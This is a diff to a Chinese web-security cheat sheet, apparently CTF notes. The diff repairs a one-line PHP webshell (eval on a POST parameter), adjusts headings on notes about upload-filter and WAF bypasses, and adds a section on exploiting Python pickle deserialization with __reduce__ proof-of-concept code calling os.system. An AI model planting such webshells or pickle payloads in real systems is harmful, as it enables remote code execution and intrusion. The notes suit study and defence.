@@ -240,7 +240,7 @@ IBM WebSphere服务器
 
 
 
-一句话木马:`<?php @eval($_POST['shell'])' ?>`
+一句话木马:`<?php @eval($_POST['shell']); ?>`
 
 `<script language="php">eval($_POST['shell']);</script>`
 
@@ -278,7 +278,7 @@ Content-Type的值修改改为：`image/png`
 
 ### .htaccess文件和.user.ini文件
 
-## .htaccess
+#### .htaccess
 
 htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能.
 也就是说如果目标服务器允许用户修改.htaccess文件我们就可以通过它改变文件拓展名或者访问功能来getshell
@@ -304,7 +304,7 @@ SetHandler application/x-httpd-php
 
 
 
-## .user.ini
+#### .user.ini
 
 \- (1)服务器脚本语言为PHP
 \- (2)对应目录下面有可执行的php文件
@@ -1397,7 +1397,7 @@ get_machine_id()：  系统id  /etc/machine-id    或者docker环境id /proc/sel
 
 
 
-# 利用PHP的字符串解析特性Bypass
+## 利用PHP的字符串解析特性Bypass
 
 **我们知道PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。例如：/?foo=bar变成Array([foo] => "bar")。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，/?%20news[id%00=42会转换为Array([news_id] => 42)。如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：**
 
@@ -1421,7 +1421,7 @@ HP需要将所有参数转换为有效的变量名，因此在解析查询字符
 | foo%20bar%00  |   foo bar   |    foo_bar    |
 |   foo%5bbar   |   foo[bar   |    foo_bar    |
 
-## Suricata
+### Suricata
 
 也许你也听过这款软件，Suricata是一个“开源、成熟、快速、强大的网络威胁检测引擎”，它的引擎能够进行实时入侵检测（IDS）、入侵防御系统（IPS）、网络安全监控（NSM）和离线流量包处理。
 
@@ -1450,7 +1450,7 @@ alert http any any -> $HOME_NET any (\
 
 
 
-# jsfuck
+## jsfuck
 
 形如
 
@@ -1462,7 +1462,7 @@ alert http any any -> $HOME_NET any (\
 
 
 
-# $ip = getIp();
+## $ip = getIp();
 
 具体waf:
 
@@ -1480,13 +1480,13 @@ echo "Sorry,you don't have permission!  Your ip is :".$ip;
 
 
 
-# $_SERVER['PHP_SELF']
+## $_SERVER['PHP_SELF']
 
 $_SERVER['PHP_SELF']代表的当前php文件的绝对路径
 
 
 
-# basename()漏洞
+## basename()漏洞
 
 basename() 函数返回路径中的文件名部分。但是它有个小问题，它会去掉文件名开头的非ASCII值。比如：
 
@@ -1521,4 +1521,94 @@ payload:
 ```
 
 上面的payload随便哪一个都可以，**主要是保证config.php后面必须是非ascii值就可以了**
+
+
+
+## pickle反序列化
+
+### pickle简介
+
+- 与PHP类似，python也有序列化功能以长期储存内存中的数据。pickle是python下的序列化与反序列化包。
+- python有另一个更原始的序列化包marshal，现在开发时一般使用pickle。
+- 与json相比，pickle以二进制储存，不易人工阅读；json可以跨语言，而pickle是Python专用的；pickle能表示python几乎所有的类型（包括自定义类型），json只能表示一部分内置类型且不能表示自定义类型。
+- pickle实际上可以看作一种**独立的语言**，通过对opcode的更改编写可以执行python代码、覆盖变量等操作。直接编写的opcode灵活性比使用pickle序列化生成的代码更高，有的代码不能通过pickle序列化得到（pickle解析能力大于pickle生成能力）。
+
+### 可序列化的对象
+
+- `None` 、 `True` 和 `False`
+- 整数、浮点数、复数
+- str、byte、bytearray
+- 只包含可封存对象的集合，包括 tuple、list、set 和 dict
+- 定义在模块最外层的函数（使用 def 定义，lambda 函数则不可以）
+- 定义在模块最外层的内置函数
+- 定义在模块最外层的类
+- `__dict__` 属性值或 `__getstate__()` 函数的返回值可以被序列化的类（详见官方文档的Pickling Class Instances）
+
+### `object.__reduce__()` 函数
+
+- 在开发时，可以通过重写类的 `object.__reduce__()` 函数，使之在被实例化时按照重写的方式进行。具体而言，python要求 `object.__reduce__()` 返回一个 `(callable, ([para1,para2...])[,...])` 的元组，每当该类的对象被unpickle时，该callable就会被调用以生成对象（该callable其实是构造函数）。
+- 在下文pickle的opcode中， `R` 的作用与 `object.__reduce__()` 关系密切：选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数。其实 `R` 正好对应 `object.__reduce__()` 函数， `object.__reduce__()` 的返回值会作为 `R` 的作用对象，当包含该函数的对象被pickle序列化时，得到的字符串是包含了 `R` 的。
+
+### 漏洞利用
+
+#### 利用思路
+
+- 任意代码执行或命令执行。
+- 变量覆盖，通过覆盖一些凭证达到绕过身份验证的目的。
+
+#### 初步认识：pickle EXP的简单demo
+
+```
+import pickle
+import os
+
+class genpoc(object):
+    def __reduce__(self):
+        s = """echo test >poc.txt"""  # 要执行的命令
+        return os.system, (s,)        # reduce函数必须返回元组或字符串
+
+e = genpoc()
+poc = pickle.dumps(e)
+
+print(poc) # 此时，如果 pickle.loads(poc)，就会执行命令
+```
+
+- 变量覆盖
+
+```
+import pickle
+
+key1 = b'321'
+key2 = b'123'
+class A(object):
+    def __reduce__(self):
+        return (exec,("key1=b'1'\nkey2=b'2'",))
+
+a = A()
+pickle_a = pickle.dumps(a)
+print(pickle_a)
+pickle.loads(pickle_a)
+print(key1, key2)
+```
+
+## php中??的作用
+
+```
+$a??$b;
+$a是不是null，如果不为null，则返回$a，否则返回$b;
+```
+
+
+
+## php短标签
+
+```
+php短标签
+ 
+<? echo '123';?>  #前提是开启配置参数short_open_tags=on
+<?=(表达式)?>  等价于 <?php echo (表达式)?>  #不需要开启参数设置
+<% echo '123';%>   #开启配置参数asp_tags=on，并且只能在7.0以下版本使用
+<script language="php">echo '123'; </script> #不需要修改参数开关，但是只能在7.0以下可用。
+ 
+```
 
